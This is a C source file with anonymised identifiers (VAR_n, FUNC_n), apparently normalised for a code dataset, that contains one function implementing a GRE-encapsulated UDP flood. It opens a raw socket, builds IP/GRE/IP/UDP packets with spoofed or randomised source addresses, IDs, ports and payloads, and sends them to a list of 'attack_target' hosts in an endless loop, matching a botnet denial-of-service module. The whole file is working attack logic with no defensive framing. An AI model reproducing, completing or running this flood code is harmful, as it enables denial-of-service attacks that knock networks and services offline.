
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef int uint16_t ;
struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; int daddr; void* check; int protocol; void* frag_off; void* tot_len; } ;
struct grehdr {void* protocol; } ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {scalar_t__ sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct attack_target {int addr; int netmask; TYPE_2__ sock_addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int VAR_21 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 void* FUNC_1 (int,int) ;
 void* FUNC_2 (int*,int) ;
 scalar_t__ FUNC_3 (struct iphdr*,struct udphdr*,void*,int) ;
 int FUNC_4 (int) ;
 scalar_t__ VAR_22 ;
 int FUNC_5 (scalar_t__) ;
 void* FUNC_6 (int) ;
 scalar_t__ FUNC_7 (int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 () ;
 int FUNC_10 (char*,int) ;
 int FUNC_11 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_12 (int,int ,int ,int*,int) ;
 int FUNC_13 (int ,int ,int ) ;

void FUNC_14(uint8_t VAR_23, struct attack_target *VAR_24, uint8_t VAR_25, struct attack_option *VAR_26)
{
    int VAR_27, VAR_28;
    char **VAR_29 = FUNC_1(VAR_23, sizeof (char *));
    uint8_t VAR_30 = FUNC_0(VAR_25, VAR_26, VAR_5, 0);
    uint16_t VAR_31 = FUNC_0(VAR_25, VAR_26, VAR_4, 0xffff);
    uint8_t VAR_32 = FUNC_0(VAR_25, VAR_26, VAR_6, 64);
    BOOL VAR_33 = FUNC_0(VAR_25, VAR_26, VAR_3, VAR_21);
    port_t VAR_34 = FUNC_0(VAR_25, VAR_26, VAR_10, 0xffff);
    port_t VAR_35 = FUNC_0(VAR_25, VAR_26, VAR_1, 0xffff);
    int VAR_36 = FUNC_0(VAR_25, VAR_26, VAR_8, 512);
    BOOL VAR_37 = FUNC_0(VAR_25, VAR_26, VAR_7, VAR_21);
    BOOL VAR_38 = FUNC_0(VAR_25, VAR_26, VAR_2, VAR_12);
    uint32_t VAR_39 = FUNC_0(VAR_25, VAR_26, VAR_9, VAR_18);

    if ((VAR_28 = FUNC_13(VAR_0, VAR_20, VAR_15)) == -1)
    {



        return;
    }
    VAR_27 = 1;
    if (FUNC_12(VAR_28, VAR_14, VAR_17, &VAR_27, sizeof (int)) == -1)
    {



        FUNC_4(VAR_28);
        return;
    }

    for (VAR_27 = 0; VAR_27 < VAR_23; VAR_27++)
    {
        struct iphdr *VAR_40;
        struct grehdr *VAR_41;
        struct iphdr *VAR_42;
        struct udphdr *VAR_43;

        VAR_29[VAR_27] = FUNC_1(1510, sizeof (char *));
        VAR_40 = (struct iphdr *)(VAR_29[VAR_27]);
        VAR_41 = (struct grehdr *)(VAR_40 + 1);
        VAR_42 = (struct iphdr *)(VAR_41 + 1);
        VAR_43 = (struct udphdr *)(VAR_42 + 1);


        VAR_40->version = 4;
        VAR_40->ihl = 5;
        VAR_40->tos = VAR_30;
        VAR_40->tot_len = FUNC_6(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_36);
        VAR_40->id = FUNC_6(VAR_31);
        VAR_40->ttl = VAR_32;
        if (VAR_33)
            VAR_40->frag_off = FUNC_6(1 << 14);
        VAR_40->protocol = VAR_13;
        VAR_40->saddr = VAR_39;
        VAR_40->daddr = VAR_24[VAR_27].addr;


        VAR_41->protocol = FUNC_6(VAR_11);


        VAR_42->version = 4;
        VAR_42->ihl = 5;
        VAR_42->tos = VAR_30;
        VAR_42->tot_len = FUNC_6(sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_36);
        VAR_42->id = FUNC_6(~VAR_31);
        VAR_42->ttl = VAR_32;
        if (VAR_33)
            VAR_42->frag_off = FUNC_6(1 << 14);
        VAR_42->protocol = VAR_16;
        VAR_42->saddr = FUNC_9();
        if (VAR_38)
            VAR_42->daddr = VAR_40->daddr;
        else
            VAR_42->daddr = ~(VAR_42->saddr - 1024);


        VAR_43->source = FUNC_6(VAR_34);
        VAR_43->dest = FUNC_6(VAR_35);
        VAR_43->len = FUNC_6(sizeof (struct udphdr) + VAR_36);
    }

    while (VAR_21)
    {
        for (VAR_27 = 0; VAR_27 < VAR_23; VAR_27++)
        {
            char *VAR_44 = VAR_29[VAR_27];
            struct iphdr *VAR_45 = (struct iphdr *)VAR_44;
            struct grehdr *VAR_46 = (struct grehdr *)(VAR_45 + 1);
            struct iphdr *VAR_47 = (struct iphdr *)(VAR_46 + 1);
            struct udphdr *VAR_48 = (struct udphdr *)(VAR_47 + 1);
            char *VAR_49 = (char *)(VAR_48 + 1);


            if (VAR_24[VAR_27].netmask < 32)
                VAR_45->daddr = FUNC_5(FUNC_7(VAR_24[VAR_27].addr) + (((uint32_t)FUNC_9()) >> VAR_24[VAR_27].netmask));

            if (VAR_39 == 0xffffffff)
                VAR_45->saddr = FUNC_9();

            if (VAR_31 == 0xffff)
            {
                VAR_45->id = FUNC_9() & 0xffff;
                VAR_47->id = ~(VAR_45->id - 1000);
            }
            if (VAR_34 == 0xffff)
                VAR_48->source = FUNC_9() & 0xffff;
            if (VAR_35 == 0xffff)
                VAR_48->dest = FUNC_9() & 0xffff;

            if (!VAR_38)
                VAR_47->daddr = FUNC_9();
            else
                VAR_47->daddr = VAR_45->daddr;

            if (VAR_37)
                FUNC_10(VAR_49, VAR_36);

            VAR_45->check = 0;
            VAR_45->check = FUNC_2((uint16_t *)VAR_45, sizeof (struct iphdr));

            VAR_47->check = 0;
            VAR_47->check = FUNC_2((uint16_t *)VAR_47, sizeof (struct iphdr));

            VAR_48->check = 0;
            VAR_48->check = FUNC_3(VAR_47, VAR_48, VAR_48->len, sizeof (struct udphdr) + VAR_36);

            VAR_24[VAR_27].sock_addr.sin_family = VAR_0;
            VAR_24[VAR_27].sock_addr.sin_addr.s_addr = VAR_45->daddr;
            VAR_24[VAR_27].sock_addr.sin_port = 0;
            FUNC_11(VAR_28, VAR_44, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_36, VAR_19, (struct sockaddr *)&VAR_24[VAR_27].sock_addr, sizeof (struct sockaddr_in));
        }






    }
}
